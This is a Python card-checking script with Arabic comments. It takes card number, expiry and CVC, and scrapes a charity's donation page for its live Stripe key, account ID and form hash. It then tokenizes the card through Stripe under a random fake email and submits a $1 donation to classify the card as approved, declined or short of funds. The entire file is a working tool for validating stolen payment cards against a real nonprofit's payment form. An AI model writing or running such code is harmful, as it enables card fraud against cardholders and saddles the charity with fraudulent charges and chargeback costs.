import requests
import random
import string
import re
import base64
import time
from user_agent import generate_user_agent

def Donate(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "❌ Invalid format"
        
        n, mm, yy, cvc = parts
        if "20" in yy:
            yy = yy.split("20")[1]
        
        session = requests.Session()
        site_url = "https://www.freedom-ride.org"
        
        user = generate_user_agent()
        
        headers = {
            'User-Agent': user,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        
        # ========== 1. جلب صفحة التبرع ==========
        response = session.get(f'{site_url}/donate/', headers=headers)
        
        # استخراج Stripe keys
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
        if not pk_live:
            return "❌ Stripe key not found"
        pk_live = pk_live.group(1)
        
        acct = re.search(r'(acct_[A-Za-z0-9_-]+)', response.text)
        if not acct:
            return "❌ Account ID not found"
        acct = acct.group(1)
        
        # استخراج بيانات النموذج
        form_id = re.search(r'name="give-form-id" value="(.*?)"', response.text)
        form_id = form_id.group(1) if form_id else "18"
        
        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
        form_prefix = form_prefix.group(1) if form_prefix else f"{form_id}-1"
        
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
        if not form_hash:
            return "❌ Form hash not found"
        form_hash = form_hash.group(1)
        
        # ========== 2. Tokenize البطاقة عبر Stripe API ==========
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user,
        }
        
        timestamp = int(time.time())
        random_email = f"user{random.randint(1000,9999)}{timestamp}@gmail.com"
        
        data_stripe = f'type=card&billing_details[name]=Test+User&billing_details[email]={random_email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F332636417d%3B+stripe-js-v3%2F332636417d%3B+split-card-element&key={pk_live}&_stripe_account={acct}'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
        
        try:
            result_json = response.json()
            if 'error' in result_json:
                return f"❌ {result_json['error'].get('message', 'Tokenization failed')}"
            pm_id = result_json['id']
        except:
            return "❌ Tokenization failed"
        
        # ========== 3. إتمام التبرع ==========
        headers_donate = headers.copy()
        headers_donate['Content-Type'] = 'application/x-www-form-urlencoded'
        headers_donate['Origin'] = site_url
        headers_donate['Referer'] = f'{site_url}/donate/'
        
        data_donate = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'Freedom Funds',
            'give-current-url': f'{site_url}/donate/',
            'give-form-url': f'{site_url}/donate/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': form_hash,
            'give-price-id': 'custom',
            'give-amount': '1.00',
            'give_stripe_payment_method': pm_id,
            'payment-mode': 'stripe',
            'give_first': 'Test',
            'give_last': 'User',
            'give_company_option': 'no',
            'give_company_name': '',
            'give_email': random_email,
            'give_comment': '',
            'card_name': 'Test User',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
        }
        
        params = {'payment-mode': 'stripe', 'form-id': form_id}
        response = session.post(f'{site_url}/donate/', params=params, headers=headers_donate, data=data_donate)
        
        text = response.text
        
        # ========== 4. تحليل النتيجة ==========
        if 'Donation Confirmation' in text or 'Thank you' in text:
            return '✅ Approved'
        elif 'insufficient' in text.lower():
            return '💰 Insufficient Funds'
        elif 'declined' in text.lower():
            return '❌ Declined'
        else:
            return '❌ Declined'
            
    except Exception as e:
        return f'❌ Error'